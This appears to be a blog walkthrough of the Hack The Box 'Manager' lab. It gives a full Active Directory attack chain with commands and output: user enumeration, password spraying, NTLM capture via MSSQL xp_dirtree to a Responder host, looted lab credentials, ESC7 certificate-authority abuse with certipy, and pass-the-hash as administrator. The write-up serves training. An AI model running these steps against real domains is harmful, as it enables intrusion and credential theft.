---
layout: post
title: "manager"
date: 2025-09-22 
categories: CPTS Playlist
---
# Attempt Two

# Summary

- kerbrute to enumerate existing users on the DC
- alternative option is to use nxc -rid-brute option to get valid users
- nxc to password spray user with their username as passwords; found one valid credential
- operator user has MSSQL access
- xp_dirtree can be used to read local files; found old backup file in web root
- found secret config file, revealing user raven’s password
- raven is a remote user, can log in using evil-winrm
- certipy-ad to find vulnerable certificates - ESC7 vulnerable to get administrator hash

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/manager 10.10.11.236

53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Manager
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-21 00:23:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-21T00:24:28+00:00; +7h00m56s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2025-09-21T00:24:27+00:00; +7h00m55s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-09-21T00:24:28+00:00; +7h00m56s from scanner time.
| ms-sql-info:
|   10.10.11.236:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-09-21T00:21:14
|_Not valid after:  2055-09-21T00:21:14
| ms-sql-ntlm-info:
|   10.10.11.236:1433:
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2025-09-21T00:24:28+00:00; +7h00m56s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2025-09-21T00:24:28+00:00; +7h00m56s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m55s, deviation: 0s, median: 7h00m55s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-09-21T00:23:49
|_  start_date: N/A

```

A lot of ports opened, also kerberos and active directory service indicating Windows box. Let’s first add the domain name to our /etc/hosts file:

```bash
10.10.11.236 manager.htb
```

First, let’s use nxc to query smb server to get the computer name, from the open ports it looks like a domain controller:

```bash
nxc smb 10.10.11.236 -u '' -p ''

SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\: 
SMB         10.10.11.236    445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED

smbclient -N -L //10.10.11.236 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.236 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

It is a DC. 

Let’s attempt to use rpcclient to get a users list.

```bash
rpcclient -U'%' 10.10.11.236

enumdomusers

result was NT_STATUS_ACCESS_DENIED
```

Let’s use kerbrute to try and bruteforce find usernames, since we already have the domain name:

```bash
./kerbrute userenum --dc 10.10.11.236 -d manager.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt > k_out.txt

2025/09/21 00:31:10 >  [+] VALID USERNAME:       ryan@manager.htb
2025/09/21 00:31:11 >  [+] VALID USERNAME:       guest@manager.htb
2025/09/21 00:31:12 >  [+] VALID USERNAME:       cheng@manager.htb
2025/09/21 00:31:12 >  [+] VALID USERNAME:       raven@manager.htb
2025/09/21 00:31:15 >  [+] VALID USERNAME:       administrator@manager.htb
2025/09/21 00:31:22 >  [+] VALID USERNAME:       Ryan@manager.htb
2025/09/21 00:31:22 >  [+] VALID USERNAME:       Raven@manager.htb
2025/09/21 00:31:25 >  [+] VALID USERNAME:       operator@manager.htb
2025/09/21 00:31:52 >  [+] VALID USERNAME:       Guest@manager.htb
2025/09/21 00:31:52 >  [+] VALID USERNAME:       Administrator@manager.htb
2025/09/21 00:32:13 >  [+] VALID USERNAME:       Cheng@manager.htb
2025/09/21 00:33:13 >  [+] VALID USERNAME:       jinwoo@manager.htb
2025/09/21 00:33:23 >  [+] VALID USERNAME:       RYAN@manager.htb
2025/09/21 00:33:59 >  [+] VALID USERNAME:       RAVEN@manager.htb
2025/09/21 00:34:01 >  [+] VALID USERNAME:       GUEST@manager.htb
2025/09/21 00:34:59 >  [+] VALID USERNAME:       Operator@manager.htb
```

Another way to bruteforce the users is to use rid brute:

```bash
nxc smb 10.10.11.236 -u 'any' -p '' --rid-brute 6000

SMB         10.10.11.236    445    DC01             [+] manager.htb\saf: (Guest)
SMB         10.10.11.236    445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.10.11.236    445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.10.11.236    445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.10.11.236    445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.10.11.236    445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.236    445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.10.11.236    445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.236    445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.10.11.236    445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.10.11.236    445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.10.11.236    445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.10.11.236    445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.10.11.236    445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.10.11.236    445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

Now only grab the usernames:

```bash
grep MANAGER nxc_out.txt | awk '{print $6}' | awk -F\\ '{print $2}' | sort -u | grep -v '\$$' | tr '[:upper:]' '[:lower:]' > users.txt

grep MANAGER nxc_out.txt | awk '{print $6}' | sort -u | grep -v '\$$' | tr '[:upper:]' '[:lower:]' > users.txt
```

Now, out of these users, let’s find asreproastable accounts:

```bash
nxc ldap MANAGER -u users.txt -p '' --asreproast asreproast.out
```

None. Let’s see if any users used their usernames as passwords:

```bash
nxc smb 10.10.11.236 -u users.txt -p users.txt --continue-on-success --no-brute

SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:administrator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\allowed:allowed (Guest)
SMB         10.10.11.236    445    DC01             [+] manager.htb\cert:cert (Guest)
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\chinhae:chinhae STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\cloneable:cloneable (Guest)
SMB         10.10.11.236    445    DC01             [+] manager.htb\denied:denied (Guest)
SMB         10.10.11.236    445    DC01             [+] manager.htb\dnsadmins:dnsadmins (Guest)
SMB         10.10.11.236    445    DC01             [+] manager.htb\dnsupdateproxy:dnsupdateproxy (Guest)
SMB         10.10.11.236    445    DC01             [+] manager.htb\domain:domain (Guest)
SMB         10.10.11.236    445    DC01             [+] manager.htb\enterprise:enterprise (Guest)
SMB         10.10.11.236    445    DC01             [+] manager.htb\group:group (Guest)
SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:guest STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\jinwoo:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\key:key (Guest)
SMB         10.10.11.236    445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
SMB         10.10.11.236    445    DC01             [+] manager.htb\protected:protected (Guest)
SMB         10.10.11.236    445    DC01             [+] manager.htb\ras:ras (Guest)
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\read-only:read-only (Guest)
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\schema:schema (Guest)
SMB         10.10.11.236    445    DC01             [+] manager.htb\sqlserver2005sqlbrowseruser$dc01:sqlserver2005sqlbrowseruser$dc01 (Guest)
SMB         10.10.11.236    445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE
```

The only non-guest user is operator. Let’s use this account to scan smb shares again:

```bash
nxc smb 10.10.11.236 -u operator -p operator --shares

SMB         10.10.11.236    445    DC01             Share           Permissions     Remark                              
SMB         10.10.11.236    445    DC01             -----           -----------     ------                                   
SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin                                    
SMB         10.10.11.236    445    DC01             C$                              Default share                    
SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC                  
SMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share          
SMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share
```

Just the default shares. Let’s see if there are any kerberoastable accounts:

```bash
nxc ldap manager.htb -u operator -p operator --kerberoasting kerberoasting.out
```

No new users. Now let’s use bloodhound to map out what privileges and rights our user has:

```bash
bloodhound-python -u operator -p operator -ns 10.10.11.236 -d manager.htb -c all
```

Now start neo4j and go on bloodhound:

```bash
sudo neo4j start
bloodhound
```

Searching up user operator, we get nothing interesting:

![image.png](Attempt%20Two%20bb4cf860bae24381bd5d686ce0534792/image.png)

Let’s also check whether we have access to MSSQL service:

```bash
nxc mssql manager.htb -u operator -p operator

MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\operator:operator
```

We do. Now let’s enumerate the database. Fist login to the db with sqsh

```bash
sqsh -S 10.10.11.236 -U MANAGER\\operator -P operator -h

1> SELECT name FROM master.dbo.sysdatabases
2> go

#Selecting a DB
1> USE tempdb
2> go

#Show tables
1> SELECT table_name FROM tempdb.INFORMATION_SCHEMA.TABLES
2> go

#Select all Data from Table "users"
1> SELECT * FROM backupfile
2> go
```

Nothing. Let’s try and capture a service users’ hash. First, let’s start a responder:

```bash
sudo responder -I tun0
```

Now make MSSQL query so it starts an authentication process:

```bash
EXEC master..xp_dirtree '\\10.10.16.7\share\'

go

DC01$::MANAGER:172e8eb0152f9412:E4BE9D9078558CEBF1624D9B91566251:010100000000000000D3E6BB352BDC013BC7401ABBBAC6D5000000000200080047005A003300310001001E00570049004E002D004A004B004A004B0045005A004400570039005000460004003400570049004E002D004A004B004A004B0045005A00440057003900500046002E0047005A00330031002E004C004F00430041004C000300140047005A00330031002E004C004F00430041004C000500140047005A00330031002E004C004F00430041004C000700080000D3E6BB352BDC0106000400020000000800300030000000000000000000000000300000773AED9ADDA1668387A48BA3622028CDB51D815B7D60CE94D881E7F14862B1CE0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0037000000000000000000

MANAGER\DC01$

xp_subdirs 
EXEC master..xp_subdirs  '\\10.10.16.7\share\'
```

It’s the computer account; not more useful than the account we already have. Let’s switch to sqlcmd. It’s easier to enumerate:

```bash
impacket-mssqlclient operator:operator@MANAGER.HTB -windows-auth
xp_dirtree c:\

```

Let’s see what’s in the web root, since port 80 is open:

```bash
xp_dirtree c:\inetpub\wwwroot

website-backup-27-07-23-old.zip       1      1 
```

That’s an interesting file. Let’s download it by simply visiting:

```bash
http://10.10.11.236/website-backup-27-07-23-old.zip  
```

Let’s unzip it:

```bash
mkdir web_backup && cd web_backup
unzip website-backup-27-07-23-old.zip

ls -al
total 1092
drwxrwxr-x 5 kali kali    4096 Sep 21 20:52 .
drwxrwxr-x 5 kali kali    4096 Sep 21 20:52 ..
-rw-rw-r-- 1 kali kali    5386 Jul 27  2023 about.html
-rw-rw-r-- 1 kali kali    5317 Jul 27  2023 contact.html
drwxrwxr-x 2 kali kali    4096 Sep 21 20:50 css
drwxrwxr-x 2 kali kali    4096 Sep 21 20:50 images
-rw-rw-r-- 1 kali kali   18203 Jul 27  2023 index.html
drwxrwxr-x 2 kali kali    4096 Sep 21 20:50 js
-rw-rw-r-- 1 kali kali     698 Jul 27  2023 .old-conf.xml
-rw-rw-r-- 1 kali kali    7900 Jul 27  2023 service.html
-rw-r--r-- 1 kali kali 1045328 Sep 21 20:48 website-backup-27-07-23-old.zip

```

The .old file looks interesting:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>

```

We get raven’s password. Let’s verify:

```bash
nxc smb manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123' --shares

SMB         10.10.11.236    445    DC01             [*] Enumerated shares
SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
SMB         10.10.11.236    445    DC01             -----           -----------     ------
SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.236    445    DC01             C$                              Default share
SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share
```

It works. Let’s see if this user can winrm to the machine:

```bash
evil-winrm -u raven -p 'R4v3nBe5tD3veloP3r!123' -i manager.htb
```

We are logged on:

![image.png](Attempt%20Two%20bb4cf860bae24381bd5d686ce0534792/image%201.png)

Let’s check bloodhound:

![image.png](Attempt%20Two%20bb4cf860bae24381bd5d686ce0534792/image%202.png)

Nothing interesting. 

Let’s check privileges:

```bash
whoami /priv

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Nothing interesting. 

Let’s use certipy-ad to check for potential vulnerable certs:

```bash
certipy-ad find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout -vuln

    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
    [+] User ACL Principals             : MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates

```

ESC7 is vulnerable. If we search up adcs hacktricks: 

https://angelica.gitbook.io/hacktricks/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation 

We scroll down to find esc7 exploitation steps. **Vulnerable Certificate Authority Access Control.**

Attack explained simply:

- There’s a special certificate template called **SubCA**.
    - It’s dangerous because if you get a certificate from it, you can act like your own certificate authority (basically, a huge level of trust).
    - That’s why normally **only admins are allowed to enroll in it**.
- Here’s the trick, since we have power over the Certificate Authority (CA) because we have Manage CA rights.
    - Even though you **can’t enroll** in SubCA directly, you **can still request it**.
    - Your request will be **denied** automatically (since you’re not an admin).
- But… because you have **Manage Certificates**, you can go into the CA and **approve/issue your own denied request** afterwards.
- Result: you now have a SubCA certificate even though you weren’t supposed to.
    - From there, you can abuse it to impersonate anyone (that’s the ESC1 part).

This attack abuses the fact that “requesting a certificate” and “approving a certificate” are two separate steps. Even if you’re denied at first, your special permissions let you **flip the denial into an approval**, giving you a powerful certificate you shouldn’t have.

First, let’s grant ourself manage certificates access right by adding ourself as a new officer:

```bash
certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

Now let’s we can start by requesting a certificate based on the SubCA template; This request will be denied, but we will save the private key and note down the request ID.

```bash
certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -template SubCA -upn administrator

[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '23.key'
[*] Wrote private key to '23.key'
[-] Failed to request certificate

```

With our Manage CA and Manage Certificates, we can then issue the failed certificate request with the ca command and the -issue-request <request ID> parameter.

```bash
certipy-ad ca -ca manager-DC01-CA -issue-request 23 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

And finally, we can retrieve the issued certificate with the req command and the -retrieve <request ID> parameter.

```bash
certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -retrieve 23

[*] Retrieving certificate with ID 23
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Loaded private key from '23.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

Attempting authentication with the issued certificate now yields the NT hash of Administrator. The command must include -domain <domain> due to the certificate's lack of domain specification:

```bash
certipy-ad auth -pfx administrator.pfx -domain manager.htb -dc-ip 10.10.11.236

[-] Got error: nameserver manager.htb is not an IP address or valid https URL
[-] Use -debug to print a stacktrace
```

I’ll use `ntpdate` to sync my VM’s time to Manager’s:

```bash
sudo ntpdate 10.10.11.236
```

Now try again:

```bash
certipy-ad auth -pfx administrator.pfx -domain manager.htb -dc-ip 10.10.11.236

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@manager.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

We now have administrator’s NT hash. Let’s attempt to login on administrator:

```bash
evil-winrm -i 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef
```
Success.